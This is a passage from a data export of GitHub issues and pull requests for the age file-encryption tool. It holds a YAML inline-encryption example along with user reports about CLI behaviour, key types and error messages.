  bWVJblU3VGpGdGY3Rlk0R05DRUdrQkJUUHVDMDVmYTlJQ21rckVrClk5SWRRamZJ
  cGRMc0pNdk1oa0lycTBxYVRtNkgxYnQ1cXJFdjN2TC9FRzAKLS0tIFkyQ3FrNmpX
  R1pSRjhGMkwraDdxT3pzMFJJMjFpTTBIdVZITzNySnpIUkUKi9uihAkgoz5Y4X2y
  6rfcnN4pOEJU2s5fLCqBAo7ByNeqzMja6jNVuh9bPV885yMn
  -----END AGE ENCRYPTED FILE-----
hey2: &hey2 !crypto/age:SingleQuoted |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSB4N2Y3
  bDhmaG8xVkZXTUU2NjRISEc2VVBHbGRiRFNudGVKWjZGYTZEMlFFCjRQRlY2NTV1
  dUpkV0Z2UU1lSThNKzlFN1ZFUUdadStNVHNlaVBZVGZqZTgKLS0tIDdTRmY5REsv
  WXRaNVJ1UmczOE4rU2VkZHAzOXlXUWpEU3plRE5qMnRUWm8KiVzlGERdxQZXoMi9
  g0ZAF3nyHC6IzFbN5zt4oXoqxS5+QQjvGY4Jly14MLoBB5/8UhoUKbT1dMLmcNyZ
  6W0=
  -----END AGE ENCRYPTED FILE-----
# This is a head comment
hey3:
  subhey: !crypto/age:DoubleQuoted ""-----BEGIN AGE ENCRYPTED FILE-----\nYWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSBQU3I0\nVUZRekRpL05EeEZKckJuTzVMT1ZZZlpKS1BCWkFmSWZyallpZ0I0ClE5R21QbWFL\nVUxzUzVqblpSckhzam1rWnVRYkFoZThiWXlMd1l0RVhVZWcKLS0tIGthdmpjdEZV\nLzNSdTFTRjdlalZwN1RFZzREV0FSOGhDUGt1bFRPQ2FsaW8KRofY20wdmWl1Qpsl\npJlNAz0RO0dAuk0TYJVwL6pmb72w0e3kUCApw0l0u/LZC3ZpTfhEmWuQO/sSWoOL\nD5g=\n-----END AGE ENCRYPTED FILE-----\n"" # this is a line comment
  # This is a foot comment
hey4: !crypto/age:Literal |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSB4MjAr
  YzFxQ1VpTlVEek9EMnZzL2hXSWpGbHExMHpGbFU0OHY5cVpoczFjCjFGS29kdXJB
  UGR6eTBGYm0wMVpzd3VkcjVOb0ptSzNSZmNkZUpxVW14YWMKLS0tIEpOSjUxVWJR
  NVp0NFBMallscXNnZlI0bGp0THlXTHpKUTRVUUt3N3ZkVkkK7snrM/VLPqIzr4sd
  CVcKteGV75hPVCfd05lDtMzlX88hBfCCSQKKnY0E7NNpaLoIirFKDrBa7F0=
  -----END AGE ENCRYPTED FILE-----
hey5: !crypto/age:Folded |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSBKNUlO
  RkhyZVArQ1QzT1F1Vk5ZcWV4QkpsRC82L2V1WkQ3bDBuMWFJblM4CkFCWVEwMkY0
  V1NNZi9ta0c3NVJJYkJvMnExakxVVS9ra0w2QklLMEdIbFkKLS0tIFk0RkJjdS9l
  ODFOanpIZ0RMMzNiVm9jcEFOTUlMblE4QVc5UWdacmtGUTAKzDRsZUr/bdAoOqQ+
  MC36ykLkRcJEJ/06+McBAe9T1lpqursExTFj7ePVHO15vBkBm1O0d8UDRw==
  -----END AGE ENCRYPTED FILE-----
hey6: *hey2
---
hey1: !crypto/age:NoTag |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSBwTGJW
  LzFJS0xWdklVQkJrUHZva2hCU2NCRXVBeEhCM1hsTnhDTVFubEFRClc0bTJnandX
  bTJnQVh0NTFpWEU3eVRzQTVLdEFnc09XSWpmSGk1dW12d00KLS0tIDNHSExLWHBH
  RCsybWZPY0czN2Z2UkJCd052VU91RVVrVm9KaUJYaTVIRDAK/cHulkevVFgQHe+h
  kAH9JPWtE3v+X024I0sHHhFuSo4XDCfBJTevwurJasYrL9Et680pEO1xKHReGD0G
  -----END AGE ENCRYPTED FILE-----
hey2: !crypto/age:SingleQuoted,NoTag |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSB1NkR4
  L2xkTG1xQm9WeWQ3MXJYMGNUWGNvODVTZ0hJa3ovcHhRdk9iMjN3CkxRSVRXTGk3
  d2FVR0VmU1pPYXV0UUhSd2w0NUtFSy9wQ0RaUTJkMzAwWDgKLS0tIHZycVljS1VI
  L0t3M3RoV1NrWU52ODlhUEpmQlc4ZCsycHcrM0NWSVR3bVEKDJRL89scCx2v88B8
  OXQAP4hpFc8kaR6DAeYkxkco+huF2ZQyH+9h32YReT6LDeBpHbkxXq2nlkXr5VCT
  vRq/rnvJJlDHRyAFkfY=
  -----END AGE ENCRYPTED FILE-----
hey3: !crypto/age:DoubleQuoted,NoTag ""-----BEGIN AGE ENCRYPTED FILE-----\nYWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSBSVVFY\nZ3U0bGxuQ2lscFNkRUp5YThvV2xJWGtlUjEwQWd4TWtjZ29reVdNCk4vc2hqTDJp\nSXpkQy9iTkdyYVczeHVseU11RmNsZlNXV1BsQ1hTOVJhUGsKLS0tIHBKVjFPOXpu\nU1pNTGZpNEhlWHdsbTZWUFJaVjBVZGprN0ZJTmtHQ2VPOWsKtpS3yiSQaTDXkCVj\nqaA6wQCRYCYc05ehZpz8ytavnLoKKc5NTMm/N2qeQ2AKxAJuX0T29lcZzl+2b9F9\n2Uu4L7tf8fMMm3+SKpk=\n-----END AGE ENCRYPTED FILE-----\n""
hey4: !crypto/age:Literal,NoTag |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSBmRDJy
  VXNWS0duNHY1RHgxZmJvWHF4OWhoMnkxeWlNcTBiRzJpdGpkb1dvCnNNYkpzSnJG
  K3k3aEwwUitTYW4yUTBCL2p6L0xBeEx0NHYwc2dkQ3dGcTQKLS0tIEZmcDhmOHo5
  NkZiM2gyWFBFdk4zdytEQkcyRU5Bam9qVkNCdGdLYmRFUkEKW2eJX+SRo54Dzm0y
  3a4FyaanMHqzButmkMLm4eQyPZOzTX/Nzc6Zi5GPCtATGKFdDjckDNMwfp2CKF+P
  fuK7aKqW6Eg=
  -----END AGE ENCRYPTED FILE-----
hey5: !crypto/age:Folded,NoTag |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSA2MWxS
  SjVLZXg3a1BqL2hWVzE2UXVHL0NmWVgxUDEwbGIrQVltaFZxR2pNClBnb1ZtSzhz
  MThTbHA0Y283bGdISnN0ZzBrMzcyM0tJOU1OQUh5Y0RmY0EKLS0tIHFFQ2pWcWNp
  Vmt0YTcwRkxhWmtSd0VINllUVVhOZXI0L1laRWJ3dkMwb2cK/xwuj6I73y3wCxQz
  wKaIkGyQNyTfscz//3hnw20fcNlI4QXyc69FxpHROi0kZ7jyFHVQYu9yilkO+MnH
  o/CGoLJ3MQ==
  -----END AGE ENCRYPTED FILE-----
```

```shell
$ age -R ~/.ssh/id_ed25519.pub -y test.yaml | age -i ~/.ssh/id_ed25519 -d -y
hey1: !crypto/age This is a string
hey2: &hey2 !crypto/age:SingleQuoted 'This is a single quoted string'
# This is a head comment
hey3:
  subhey: !crypto/age:DoubleQuoted ""This is a double quoted string"" # this is a line comment
  # This is a foot comment
hey4: !crypto/age:Literal |-
  This is a literal string
hey5: !crypto/age:Folded >-
  This is a folded string
hey6: *hey2
---
hey1: This is a string with no tag
hey2: 'This is a single quoted string with no tag'
hey3: ""This is a double quoted string with no tag""
hey4: |-
  This is a literal string with no tag
hey5: >-
  This is a folded string with no tag
```",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/162/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/162/comments,https://api.github.com/repos/FiloSottile/age/issues/162/events,https://github.com/FiloSottile/age/pull/162,https://api.github.com/repos/FiloSottile/age/pulls/162
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/161,756637514,MDExOlB1bGxSZXF1ZXN0NTMyMTU2MDA2,161,Add gopkg.in/yaml.v3 Marshaller/Unmarshaller,153052,closed,FALSE,NA,NA,5,2020-12-03T22:24:43Z,2021-01-24T15:12:42Z,2020-12-04T23:53:20Z,NONE,NA,"I think there is a great lack of a tool which would allow inline crypting/decrypting of yaml data.

Working the Ops side of DevOps I have a lot of YAML (mostly kubernetes manifests) with sensitive data I'd like to cipher inline.

Let me know what you think.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/161/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/161/comments,https://api.github.com/repos/FiloSottile/age/issues/161/events,https://github.com/FiloSottile/age/pull/161,https://api.github.com/repos/FiloSottile/age/pulls/161
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/160,754728409,MDU6SXNzdWU3NTQ3Mjg0MDk=,160,Decryption arguments unexpectedly order dependent,1594167,open,FALSE,NA,NA,2,2020-12-01T21:10:19Z,2021-04-19T03:57:40Z,NA,NONE,NA,"## Environment

* OS: Linux defiant 5.9.8-arch1-1 #1 SMP PREEMPT Tue, 10 Nov 2020 22:44:11 +0000 x86_64 GNU/Linux
* age version: 6593c56e335f20a76275373a8b1ddf51fb662ab6

## What were you trying to do
Decrypt was a file

## What happened
Decryption arguments unexpectedly order dependent

```
 igloo@defiant  ~/workf  ../git/age/age -d IMG_20201201_205126.jpg.age -i ../git/age/somekey > img.jpg
Error: too many arguments.
age accepts a single optional argument for the input file.
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
 ✘ igloo@defiant  ~/workf  ../git/age/age -d -i ../git/age/somekey IMG_20201201_205126.jpg.age > img.jpg 

```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/160/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/160/comments,https://api.github.com/repos/FiloSottile/age/issues/160/events,https://github.com/FiloSottile/age/issues/160,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/159,752989752,MDU6SXNzdWU3NTI5ODk3NTI=,159,UX: Empty files created upon passphrase mismatch,3046210,closed,FALSE,NA,6688826,0,2020-11-29T19:35:49Z,2021-04-22T17:49:57Z,2021-01-03T14:10:28Z,NONE,NA,"## What were you trying to do

Create an encrypted file using a symmetric key. 

## What happened

When a passphrase is entered incorrectly, an empty output file is created.
My expectation was that no file would be created until after the program has performed the encryption operation.

```bash
$ echo ""Hello World"" > test.txt
$ age -p -o test.txt.age test.txt
Enter passphrase (leave empty to autogenerate a secure one):  Test
Confirm passphrase: test
Error: passphrases didn't match
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
$ ls -l
-rw-r--r-- 1 user user   12 Nov 29 13:31 test.txt
-rw-r--r-- 1 user user    0 Nov 29 13:32 test.txt.age
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/159/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/159/comments,https://api.github.com/repos/FiloSottile/age/issues/159/events,https://github.com/FiloSottile/age/issues/159,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/158,751856946,MDExOlB1bGxSZXF1ZXN0NTI4Mjg5ODg4,158,age: add ParseRecipients,153052,closed,FALSE,NA,NA,2,2020-11-26T22:55:04Z,2021-01-03T14:10:24Z,2021-01-03T14:10:24Z,NONE,NA,"Add a ParseRecipients which can read a file containing one public key per line.

It also supports extracting public keys from the output of age-keygen.

Signed-off-by: Sylvain Rabot <sylvain@abstraction.fr>",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/158/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/158/comments,https://api.github.com/repos/FiloSottile/age/issues/158/events,https://github.com/FiloSottile/age/pull/158,https://api.github.com/repos/FiloSottile/age/pulls/158
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/157,749942661,MDU6SXNzdWU3NDk5NDI2NjE=,157,No way to know age version any more?,10784194,closed,FALSE,NA,6688826,1,2020-11-24T18:29:17Z,2021-04-22T17:50:11Z,2021-01-03T14:10:26Z,NONE,NA,"## Environment

* OS: Centos 8
* age version: built from source 'git clone https://filippo.io/age' on Nov.24,2020; have no idea what the version is

## What were you trying to do
$ ./age --version

## What happened
error:
flag provided but not defined: -version
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/157/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/157/comments,https://api.github.com/repos/FiloSottile/age/issues/157/events,https://github.com/FiloSottile/age/issues/157,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/156,749793793,MDU6SXNzdWU3NDk3OTM3OTM=,156,spec: Cannot access spec URL,65312587,closed,FALSE,NA,NA,4,2020-11-24T15:08:42Z,2020-11-24T17:44:31Z,2020-11-24T16:18:23Z,NONE,NA,"I have been trying since Saturday to read the age spec URL but, each time, Chrome reports an invalid TLS negotiation and refuses to load the site.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/156/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/156/comments,https://api.github.com/repos/FiloSottile/age/issues/156/events,https://github.com/FiloSottile/age/issues/156,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/155,747880771,MDExOlB1bGxSZXF1ZXN0NTI1MDI0NDAz,155,Switch from Travis CI to GitHub Actions,1225294,closed,FALSE,NA,NA,0,2020-11-21T00:34:42Z,2020-11-21T00:50:11Z,2020-11-21T00:50:11Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/155/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/155/comments,https://api.github.com/repos/FiloSottile/age/issues/155/events,https://github.com/FiloSottile/age/pull/155,https://api.github.com/repos/FiloSottile/age/pulls/155
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/154,742986513,MDU6SXNzdWU3NDI5ODY1MTM=,154,spec: Add progress option,10137,closed,TRUE,NA,NA,1,2020-11-14T11:31:03Z,2021-04-19T00:42:51Z,2021-04-19T00:42:51Z,NONE,NA,"Is it possible to add an option to show the progress?
If you implement it, you should not display it by default according to Unix philosophy.
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/154/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/154/comments,https://api.github.com/repos/FiloSottile/age/issues/154/events,https://github.com/FiloSottile/age/issues/154,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/153,739724181,MDU6SXNzdWU3Mzk3MjQxODE=,153,idea: GUI,74195216,closed,TRUE,NA,NA,7,2020-11-10T09:06:38Z,2021-04-19T00:47:55Z,2021-04-19T00:47:54Z,NONE,NA,"Not sure whether this is better suited for the Mailing List or here. Sorry, if I got it wrong.

Are there any plans for a GUI or is one in development? I just think that this would make the usage of Age much easier for people that don't feel comfortable using a terminal.

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/153/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/153/comments,https://api.github.com/repos/FiloSottile/age/issues/153/events,https://github.com/FiloSottile/age/issues/153,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/152,733693029,MDU6SXNzdWU3MzM2OTMwMjk=,152,UX: Allow access to internal format for API usage,2128384,closed,TRUE,NA,NA,1,2020-10-31T10:55:54Z,2021-04-19T00:50:45Z,2021-04-19T00:50:45Z,NONE,NA,"
## What were you trying to do

I am building an ssh agent able to decrypt age files using the extension mechanism based on [previous work](https://github.com/42wim/sagent) from [42wim](https://github.com/42wim). In the code I am parsing the age header to detect what ssh key could be used for decryption (see code [here](https://github.com/IxDay/janus/blob/master/pkg/janus/agent.go#L175))

## What happened

The format code is stored in the internal directory making it not available externally. This forced me to copy the entire file in my repository. Would it be possible to move this to a globally available namespace, allowing program and libraries to parse the header?
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/152/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/152/comments,https://api.github.com/repos/FiloSottile/age/issues/152/events,https://github.com/FiloSottile/age/issues/152,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/151,732283102,MDU6SXNzdWU3MzIyODMxMDI=,151,spec: A way to pass custom label (associated data) - for auditing / access control,630151,closed,TRUE,NA,NA,0,2020-10-29T12:45:37Z,2021-04-19T00:53:18Z,2021-04-19T00:53:18Z,NONE,NA,"Use case: an organization has a centralized key management server (""KMS"") that only has access to the decryption keys.

The organization backs up all servers' services' data using Age. All of the backup files could have labels saying `com.myorg:backup:server:SERVER_ID:service:SERVICE_NAME` (just an example using hierarchical Amazon AWS-style resource names).

When a user wants to access the backup, she needs to ask the KMS to decrypt the data (or at least to unwrap the file key).

For auditing, it would be nice if the KMS could have tamper-proof auditing of which user accessed which data. This labeling could provide this facility.

Also, the KMS could tie authorization to these labels (this user is allowed to access these servers). This is of course outside the scope of Age, but is something that the label feature would enable.

Most of the stanzas are already using AEAD constructions which support passing AD (unencrypted-but-authenticated) data, but Age currently doesn't support binding user-supplied label to the ciphertext.

This unencrypted label could appear on the last line of the header.

Is the spec already frozen? P.S. I could not find a mention saying if this v1 spec is living draft or frozen, so I don't know if it's suitable to propose possibly backwards-compat breaking enhancements and as an end-user I don't know if I can start using Age and have a promise that the encrypted files I make today will be supported in five years?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/151/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/151/comments,https://api.github.com/repos/FiloSottile/age/issues/151/events,https://github.com/FiloSottile/age/issues/151,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/150,720479941,MDU6SXNzdWU3MjA0Nzk5NDE=,150,Encrypted file is destroyed when decrypting with same input and output filename,2545071,closed,FALSE,NA,NA,2,2020-10-13T16:09:08Z,2020-10-14T20:06:31Z,2020-10-14T20:06:31Z,NONE,NA,"## Environment

* OS: **MacOS Catalina 10.15.6**
* age version: **age 1.0.0-beta2**

## What were you trying to do

Decrypt a file with passphrase but mistakenly enter the output filename to be the same as the encrypted filename. See below:
```
age -d test.txt.age > test.txt.age
```

## What happened

age prints an error, but the encrypted file is destroyed (has size of 0 bytes).


```
~/agetest » age -d test.txt.age > test.txt.age                                                                            penkovski@mbpro-2
Error: failed to read header: parsing age header: failed to read intro: EOF
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
--------------------------------------------------------------------------------------------------------------------------------------------
~/agetest » ls -la                                                                                                        
total 0
drwxr-xr-x   3 penkovski  staff    96 Oct 13 18:53 .
drwxr-xr-x+ 94 penkovski  staff  3008 Oct 13 18:54 ..
-rw-r--r--   1 penkovski  staff     0 Oct 13 18:53 test.txt.age
```

I would suggest in case the user has accidentally made such a mistake (i.e. autocomplete) to have the option to try again with different output name. Currently, the encrypted file is destroyed after the first attempt.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/150/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/150/comments,https://api.github.com/repos/FiloSottile/age/issues/150/events,https://github.com/FiloSottile/age/issues/150,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/149,719001995,MDU6SXNzdWU3MTkwMDE5OTU=,149,UX: Redirecting age-keygen STDOUT provides inaccurate error message,1126756,closed,FALSE,NA,6688826,4,2020-10-12T02:59:08Z,2021-04-22T17:50:06Z,2021-01-03T14:10:27Z,NONE,NA,"## What were you trying to do
Redirect the STDOUT output from `age-keygen` to a file.

## What happened
A warning message that suggested failure has occurred. It notes: ""...and trying again"" when it actually generated a key and wrote it out successfully.

```shell
$ age-keygen > ~/mysecret
Warning: writing to a world-readable file.
Consider setting the umask to 066 and trying again.
Public key: age1l07jr8524hmuer...
$ echo $?
0
```

## Suggestion
Change the warning message to be something more helpful like: 
```
$ age-keygen > ~/mysecret
Warning: writing to a world-readable file. Consider setting the umask to 066 to make it only readable by you.
$
```",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/149/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/149/comments,https://api.github.com/repos/FiloSottile/age/issues/149/events,https://github.com/FiloSottile/age/issues/149,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/148,718618771,MDU6SXNzdWU3MTg2MTg3NzE=,148,Pre-Built Binaries Missing,835733,closed,FALSE,NA,6688826,2,2020-10-10T13:19:41Z,2021-04-22T17:50:25Z,2021-01-02T22:41:45Z,NONE,NA,The readme mentions pre-built Go binaries but they are missing from Github releases page.,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/148/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/148/comments,https://api.github.com/repos/FiloSottile/age/issues/148/events,https://github.com/FiloSottile/age/issues/148,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/147,714438767,MDExOlB1bGxSZXF1ZXN0NDk3NTI2MDAx,147,Return error value when no identity matches a recipient,6227720,closed,FALSE,NA,NA,1,2020-10-05T00:42:05Z,2021-01-31T22:30:07Z,2021-01-31T21:12:14Z,NONE,NA,"Use an error value `ErrNoMatchedIdentities` when `Decrypt` fails due to none of the
provided identities matching the intended recipient. This allows API consumers to specifically
handle the scenario where someone is trying to decrypt something they shouldn't.

This should be a non-breaking API change, as the original error was just an error string.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/147/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/147/comments,https://api.github.com/repos/FiloSottile/age/issues/147/events,https://github.com/FiloSottile/age/pull/147,https://api.github.com/repos/FiloSottile/age/pulls/147
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/146,712840701,MDExOlB1bGxSZXF1ZXN0NDk2MjU2Nzcx,146,age-keygen: Add option to compute pubkey from privkey,439973,closed,FALSE,NA,NA,1,2020-10-01T13:23:33Z,2021-03-10T10:40:06Z,2021-03-10T10:38:49Z,CONTRIBUTOR,NA,"This PR adds an option to `age-keygen` to compute an Curve25519 public key from the respective private key.

It currently implements this:

```
Usage of ./age-keygen:
  -o FILE
        output to FILE (default stdout)
  -pubkey
        Read the private key from standard input print the corresponding public key.
```

This is different from what I proposed in issue #122, in the way that it *only* reads from standard input. `--pubkey` does not take an (optional) file argument.

The reason is that in order to implement this, we need to overhaul the command line flag parsing, including the usage string. It feels like that is a bit too involved for such a small change.

In the future, we can update `age-keygen` such that it also accepts `-p` (as an alias to `--pubkey`) and that the option can take an optional file argument, from which the private key should be read.

---

Fixes #122",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/146/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/146/comments,https://api.github.com/repos/FiloSottile/age/issues/146/events,https://github.com/FiloSottile/age/pull/146,https://api.github.com/repos/FiloSottile/age/pulls/146
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/145,712833518,MDExOlB1bGxSZXF1ZXN0NDk2MjUwNjQx,145,Allow reading identity from stdin as '-',439973,closed,FALSE,NA,NA,1,2020-10-01T13:15:04Z,2021-01-03T14:10:29Z,2021-01-03T14:10:29Z,CONTRIBUTOR,NA,"This PR adds support for reading input identities from `/dev/stdin`, by specifying `./age -d -i - hello.age`. When standard input is already being read, `age` will error with `Error reading ""-"": standard input is used than once`.

Fixes #143.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/145/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/145/comments,https://api.github.com/repos/FiloSottile/age/issues/145/events,https://github.com/FiloSottile/age/pull/145,https://api.github.com/repos/FiloSottile/age/pulls/145
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/144,710295453,MDU6SXNzdWU3MTAyOTU0NTM=,144,Did not Autogen Password,2659478,closed,FALSE,NA,NA,3,2020-09-28T14:05:21Z,2021-01-02T23:17:26Z,2021-01-02T23:17:25Z,NONE,NA,"## Environment

* OS: macOS 10.15
* age version: Latest

## What were you trying to do

Encrypt using a passphrase and autogen the password

## What happened

Did not prompt me to autogen the password

```
apollos-templates % age -p apollos-api/.env.shared > apollos-api/.env.shared.age                                             (secrets) apollos-templates ?*
Enter passphrase: 
Error: empty scrypt password
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/144/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/144/comments,https://api.github.com/repos/FiloSottile/age/issues/144/events,https://github.com/FiloSottile/age/issues/144,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/143,706716099,MDU6SXNzdWU3MDY3MTYwOTk=,143,UX: `age -d -identity -` should read from stdin,439973,closed,FALSE,NA,6688826,0,2020-09-22T21:51:49Z,2021-04-22T17:48:53Z,2021-01-03T14:10:29Z,CONTRIBUTOR,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do

I was testing my backups, and I wanted to decrypt a file using some identity. I just indented to copy paste the identity into stdin. I expected this to work:

```
# Should dump the first couple of lines of this backup file
age --decrypt --identity - backup_file.age | head
```

Here, I expected age to follow the general Linux convention that `-` usually means standard input/output.

## What happened

age tried to read the file from a (nonexistent) literal file `-`. I solved this easily:

```
# Should dump the first couple of lines of this backup file
age --decrypt --identity /dev/stdin backup_file.age | head
```


```
23:48:35 1d [daan@roku:/srv/katarastorage/private/backup/suki_backup] $ age --decrypt --identity - backup_file.age
Error: failed to open file: open -: no such file or directory
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
23:48:35 1d [daan@roku:/srv/katarastorage/private/backup/suki_backup] $ age --decrypt --identity /dev/stdin backup_file.age
[PASTE OF SECRET KEY]
[^D]
[backup contents printed by age]
```

I would like to fix this bug myself, is possible! :)",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/143/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/143/comments,https://api.github.com/repos/FiloSottile/age/issues/143/events,https://github.com/FiloSottile/age/issues/143,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/142,695444733,MDU6SXNzdWU2OTU0NDQ3MzM=,142,Support for ecdsa-sha2-nistp256 SSH public key algorithm,605070,open,FALSE,NA,NA,4,2020-09-07T23:53:28Z,2021-04-19T00:54:50Z,NA,NONE,NA,"## Environment

* OS: Linux

## What were you trying to do

> Encrypt a file with my public key using **ecdsa-sha2-nistp256**

I was following a workflow where I wanted to encrypt a secret with all public keys listed on my GitHub account -- https://github.com/fzakaria.keys
One of the keys is _ecdsa-sha2-nistp256_ which age does not seem to support.

## What happened

```
echo ""hello world"" | age -r ""ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMSpLrw3iBKaZTxtOY6E8xzekgmhqjnCKl+biR7/AxIqkB2aqK+rO3F3p2oD3SQvJJuw/ifmryq8FOjlOH1JQ6M="" -a
Error: unknown recipient type: ""ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMSpLrw3iBKaZTxtOY6E8xzekgmhqjnCKl+biR7/AxIqkB2aqK+rO3F3p2oD3SQvJJuw/ifmryq8FOjlOH1JQ6M=""
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/142/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/142/comments,https://api.github.com/repos/FiloSottile/age/issues/142/events,https://github.com/FiloSottile/age/issues/142,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/141,695134381,MDExOlB1bGxSZXF1ZXN0NDgxNDE4OTEz,141,Use explicit conversion to avoid go-test error,12737903,closed,FALSE,NA,NA,0,2020-09-07T14:03:02Z,2020-09-07T14:07:11Z,2020-09-07T14:07:10Z,CONTRIBUTOR,NA,Fixes #138,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/141/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/141/comments,https://api.github.com/repos/FiloSottile/age/issues/141/events,https://github.com/FiloSottile/age/pull/141,https://api.github.com/repos/FiloSottile/age/pulls/141
